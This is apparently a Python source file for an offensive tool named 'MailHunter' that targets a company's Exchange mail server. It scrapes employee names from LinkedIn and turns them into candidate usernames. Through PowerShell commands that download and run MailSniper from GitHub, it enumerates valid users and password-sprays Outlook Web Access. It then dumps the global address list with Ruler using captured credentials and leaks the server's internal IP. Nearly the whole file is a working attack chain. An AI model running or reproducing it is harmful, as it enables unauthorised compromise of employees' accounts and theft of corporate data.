from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time, getpass, re, os, signal, sys, zipfile, urllib.request, socket

def signal_handler(sig, frame):
    print('You pressed Ctrl+C!')
    os.system("taskkill /F /im firefox.exe")
    sys.exit(0)

def setup_env():
    if os.name != "nt":
        print("Script must run on windows.")
        sys.exit(0)
    
    if not os.path.exists('geckodriver.exe'):
        print("Downloading geckodriver.exe")
        urllib.request.urlretrieve ("https://github.com/mozilla/geckodriver/releases/download/v0.29.0/geckodriver-v0.29.0-win64.zip", "geckodriver.zip")
        with zipfile.ZipFile("geckodriver.zip", 'r') as zip_ref:
            zip_ref.extractall(".")
            
        os.remove("geckodriver.zip")
            
    if not os.path.exists('ruler-win64.exe'):
        print("Downloading ruler-win64.exe")
        urllib.request.urlretrieve ("https://github.com/sensepost/ruler/releases/download/2.4.1/ruler-win64.exe", "ruler-win64.exe")
        
    signal.signal(signal.SIGINT, signal_handler)

def clean_users(tmp):
    f = open("linkedin_employees.txt","w")
    result = tmp.split("$$$,")
    for line in result:
        firstname = line.split(" ")[0].lower()
        secondname = line.split(" ")[1].lower()
        fn = re.sub(r"[^a-z]+", "", firstname)
        sn = re.sub(r"[^a-z]+", "", secondname)

        if( len(fn) > 2 and len(sn) > 2):
            f.write(fn+" "+sn+"\n")
            
    f.close()
    print("Linkedin employees saved to linkedin_employees.txt file.")

def get_employees(username, password, company_id):
    print("Creating the web driver instance...")
    options = webdriver.FirefoxOptions() # comment this line to make visible
    options.add_argument('-headless') # comment this line to make visible
    driver = webdriver.Firefox(options=options) # remove this "options=options" to make visible
    driver.get('https://www.linkedin.com/login')

    print("Authenticating to linkedIn...")
    user = driver.find_element_by_id('username')
    passwd = driver.find_element_by_id('password')
    submit = driver.find_element(By.XPATH, '//button[text()="Sign in"]')
    user.send_keys(username)
    passwd.send_keys(password)
    submit.click()
    
    company_url = "https://www.linkedin.com/company/" + company_id + "/people/"
    print("Loading the company url:", company_url)
    driver.get(company_url)

    print("Starting employees collection script (maximum 1000)...")
    driver.execute_script("""
    result = document.createElement("P")
    result.innerText = "-1"
    result.id = '40404040'
    document.body.appendChild(result)

    num_of_employees = document.createElement("P")
    num_of_employees.innerText = "-1"
    num_of_employees.id = '50505050'
    document.body.appendChild(num_of_employees)

    num_of_collected_employess = document.createElement("P")
    num_of_collected_employess.innerText = "-1"
    num_of_collected_employess.id = '60606060'
    document.body.appendChild(num_of_collected_employess)

    arr = []
            
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms))
    }
            
    async function connections() {
        while(1){
            window.scrollTo(0,document.body.scrollHeight/0)
            await sleep(2000)
            window.scrollTo(0,document.body.scrollHeight/1)
            await sleep(2000)
                
            count = parseInt(document.getElementsByClassName('t-20 t-black t-bold')[0].innerText.split(" ")[0])
            document.getElementById('50505050').innerText = count
        
            data = document.getElementsByClassName('artdeco-entity-lockup__title ember-view')
            document.getElementById('60606060').innerText = data.length
        
            if(data.length >= count || data.length >= 1000) { break }
        }

        data = document.getElementsByClassName('org-people-profile-card__profile-title t-black lt-line-clamp lt-line-clamp--single-line ember-view')
        for(i=1;i<data.length;i++){
            if(i == data.length-1){
            arr.push(data[i].innerText)
            }
            else{
            arr.push(data[i].innerText+"$$$")
            }
        }
      
        document.getElementById('40404040').innerText = arr
    }
            
    connections()
    """)

    print("Starting the monitor script...")
    while(1):
        time.sleep(5)
        result = driver.execute_script("return document.getElementById('40404040').innerText")
        num_of_employees = driver.execute_script("return document.getElementById('50505050').innerText")
        print("Number of total employees:", num_of_employees)
        num_of_collected_employess = driver.execute_script("return document.getElementById('60606060').innerText")
        print("Number of collected employees:", num_of_collected_employess)
        
        if result != '-1':
            driver.quit()
            break
          
        print("Script still working...")
    
    print("Script finished his execution.")
    clean_users(result)

def internalIP(server):
    IP = socket.gethostbyname(server)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, 80))
    s.sendall(b'GET /autodiscover/autodiscover.xml HTTP/1.0 \r\n\r\n')
    data = s.recv(1024)
    s.close()
    for x in data.decode("utf-8").split("\r\n"):
        if "basic realm" in x.lower():
            print("Found the internal IP:", x.split('"')[1])
            return
    
    print("Mail server not vulnerable!")

def mailsniper_internaldomain(server, company_name):
    command = 'PowerShell.exe -c "IEX (New-Object Net.WebClient).DownloadString("""https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1"""); Invoke-DomainHarvestOWA -ExchHostname ' + server + '; Invoke-DomainHarvestOWA -ExchHostname ' + server + ' -CompanyName \'' + company_name + '\' -Brute"'
    print(command)
    os.system(command)

def name_schema():
    fread = open("linkedin_employees.txt","r")
    lines = fread.readlines()
    fread.close()
    fwrite = open('tmp.txt', 'w')
    count = 0
    for line in lines:
        line2 = line.strip("\n")
        if count == 20:
            break
        if line2 != "" and line2 != " ":
            firstname = line2.split(" ")[0]
            secondname = line2.split(" ")[1]
            fwrite.write(firstname+"."+secondname+"\n")
            fwrite.write(firstname+"_"+secondname+"\n")
            fwrite.write(firstname+secondname+"\n")
            fwrite.write(firstname[0]+"."+secondname+"\n")
            fwrite.write(firstname[0]+secondname+"\n")
            fwrite.write(firstname+"."+secondname[0]+"\n")
            fwrite.write(firstname+secondname[0]+"\n")
            count = count + 1
    fwrite.close()

def name_schema_generate(schema):
    fread = open("linkedin_employees.txt","r")
    lines = fread.readlines()
    fread.close()
    fwrite = open("schema_name_generated.txt","w")
    if schema == "1":
        for line in lines:
            user = line.strip("\n")
            if user != "" and user != " ":
                firstname = user.split(" ")[0]
                secondname = user.split(" ")[1]
                fwrite.write(firstname+"."+secondname+"\n")
    elif schema == "2":
        for line in lines:
            user = line.strip("\n")
            if user != "" and user != " ":
                firstname = user.split(" ")[0]
                secondname = user.split(" ")[1]
                fwrite.write(firstname+secondname+"\n")
    elif schema == "3":
        for line in lines:
            user = line.strip("\n")
            if user != "" and user != " ":
                firstname = user.split(" ")[0]
                secondname = user.split(" ")[1]
                fwrite.write(firstname[0]+"."+secondname+"\n")
    elif schema == "4":
        for line in lines:
            user = line.strip("\n")
            if user != "" and user != " ":
                firstname = user.split(" ")[0]
                secondname = user.split(" ")[1]
                fwrite.write(firstname[0]+secondname+"\n")
    else:
        print("Not valid schema number")
    
    fwrite.close()
    print("Name schema generated and save to schema_name_generated.txt file.")

def mailsniper_userenum(server, internal_domain, infile, outfile):
    command = 'PowerShell.exe -c "IEX (New-Object Net.WebClient).DownloadString("""https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1"""); Invoke-UsernameHarvestOWA -ExchHostname ' + server + ' -Domain ' + internal_domain + ' -UserList ' + infile + ' -OutFile ' + outfile +'"'
    print(command)
    os.system(command)
    
def mailsniper_passwordspray(server, password, validusers, outfile):
    command = 'PowerShell.exe -c "IEX (New-Object Net.WebClient).DownloadString("""https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1"""); Invoke-PasswordSprayOWA -ExchHostname ' + server + ' -UserList ' + validusers + ' -Password \''+ password + '\' -Threads 5 -OutFile ' + outfile +'"'
    print(command)
    os.system(command)

def ruler_addresslist(server, email, user, password, outfile):
    command = ".\\ruler-win64.exe --nocache -k --verbose --url " + server + " --email " + email + " -u " + user + " -p \"" + password + "\" abk dump --output " + outfile 
    print(command)
    os.system(command)

def modify_address_list(internal_domain):
    fread = open("address_list.txt","r")
    lines = fread.readlines()
    fread.close()
    fwrite = open("modified_address_list.txt", "w")
    for line in lines:
        line1 = line.split(" ")[-1]
        line2 = line1.split("@")[0].strip("\n")
        if line2 != "" and line2 != " ":
            user = internal_domain + "\\" + line2
            fwrite.write(user+"\n")
    fwrite.close()
    print("Modified address list saved as modified_address_list.txt file.")

try:
    setup_env()
    
    print("Welcome to MailHunter tool.")
    print("Choose What you want to do...")
    print("0- Full MailHunter attack chain.")
    print("1- Get employees from linkedin company.")
    print("2- Get company internal domain.")
    print("3- Identify company employees name schema.")
    print("4- Generate employees based on the identified name schema.")
    print("5- Start users enumeration process.")
    print("6- Start password spraying attack.")
    print("7- Get employees global address list.")
    print("8- Get the mail server internal IP.")
    
    choice = input("Please enter your choice: ")
    
    if choice == "0":
        print("Enter your linkedin information...")
        username = input('Enter your email: ')
        password = getpass.getpass('Enter your password: ')
        company_id = input('Enter the linkedin company ID you want to search: ')
    
        print("Exec get employees.")
        get_employees(username, password, company_id)
    
        server = input('Enter the company exchange server domain: ')
        company_name = input('Enter the comapany name: ')
        
        print("Exec internal domain enumeration.")
        mailsniper_internaldomain(server, company_name)
        
        print("Exec name schema.")
        name_schema()
        
        internal_domain = input('Enter the comapany internal domain: ')
        
        print("Exec user enum.")
        mailsniper_userenum(server, internal_domain, "tmp.txt", "intial_employees_schema.txt")
        os.remove("tmp.txt")
    
        print("Enter the employees identified name schema...")
        print("1- Firstname.Lastname example hassan.saad")
        print("2- FirstnameLastname exmaple hassansaad")
        print("3- FirstnameChar.Lastname example h.saad")
        print("4- FirstnameCharLastname example hsaad")
        schema = input('Enter your choice: ')
        
        print("Exec name schema generate.")
        name_schema_generate(schema)
    
        print("Exec user enum.")
        mailsniper_userenum(server, internal_domain, "schema_name_generated.txt", "valid_employees_usernames.txt")
        
        password = input('Enter the password you want to try: ')
        print("Exec password spray.")
        mailsniper_passwordspray(server, password, "valid_employees_usernames.txt", "intial_valid_passwords.txt")
        
        valid_email = input('Enter a valid email (username@domain.com): ')
        valid_username = input('Enter a valid username: ')
        valid_password = input('Enter a valid password: ')
       
        print("Exec address list.")
        ruler_addresslist(server, valid_email, valid_username, valid_password, "address_list.txt")

        print("Exec modify address list.")
        modify_address_list(internal_domain)
        
        mailsniper_passwordspray(server, valid_password, "modified_address_list.txt", "full_valid_passwords.txt")
    
    elif choice == "1":
        print("Enter your linkedin information...")
        username = input('Enter your email: ')
        password = getpass.getpass('Enter your password: ')
        company_id = input('Enter the linkedin company ID you want to search: ')
    
        print("Exec get employees.")
        get_employees(username, password, company_id)
    
    elif choice == "2":
        server = input('Enter the company exchange server domain: ')
        company_name = input('Enter the comapany name: ')
        
        print("Exec internal domain enumeration.")
        mailsniper_internaldomain(server, company_name)
        
    elif choice == "3":
        print("Exec name schema.")
        name_schema()
        
        server = input('Enter the company exchange server domain: ')
        internal_domain = input('Enter the comapany internal domain: ')
        
        print("Exec user enum.")
        mailsniper_userenum(server, internal_domain, "tmp.txt", "intial_employees_schema.txt")
        os.remove("tmp.txt")
    
    elif choice == "4":
        print("Enter the employees identified name schema...")
        print("1- Firstname.Lastname example hassan.saad")
        print("2- FirstnameLastname exmaple hassansaad")
        print("3- FirstnameChar.Lastname example h.saad")
        print("4- FirstnameCharLastname example hsaad")
        schema = input('Enter your choice: ')
        
        print("Exec name schema generate.")
        name_schema_generate(schema)
        
    elif choice == "5":
        server = input('Enter the company exchange server domain: ')
        internal_domain = input('Enter the comapany internal domain: ')
    
        print("Exec user enum.")
        mailsniper_userenum(server, internal_domain, "schema_name_generated.txt", "valid_employees_usernames.txt")
        
    elif choice == "6":
        server = input('Enter the company exchange server domain: ')
        password = input('Enter the password you want to try: ')
        whichfile = input('Which file you want, 1- valid_employees_usernames.txt OR 2- modified_address_list.txt: ')
        print("Exec password spray.")
        if whichfile == "1":
            mailsniper_passwordspray(server, password, "valid_employees_usernames.txt", "intial_valid_passwords.txt")
        elif whichfile == "2":
            mailsniper_passwordspray(server, password, "modified_address_list.txt", "full_valid_passwords.txt")
        
    elif choice == "7":
        server = input('Enter the company exchange server domain: ')
        internal_domain = input('Enter the comapany internal domain: ')
        valid_email = input('Enter a valid email (username@domain.com): ')
        valid_username = input('Enter a valid username: ')
        valid_password = input('Enter a valid password: ')
        
        print("Exec address list.")
        ruler_addresslist(server, valid_email, valid_username, valid_password, "address_list.txt")

        print("Exec modify address list.")
        modify_address_list(internal_domain)
    
    elif choice == "8":
        server = input('Enter the company exchange server domain: ')
        internalIP(server)
    
    else:
        print("Unrecognized option !!!")
    
except Exception as e:
    print('Exception has occurred!', e)
    os.system("taskkill /F /im firefox.exe")
    sys.exit(0)
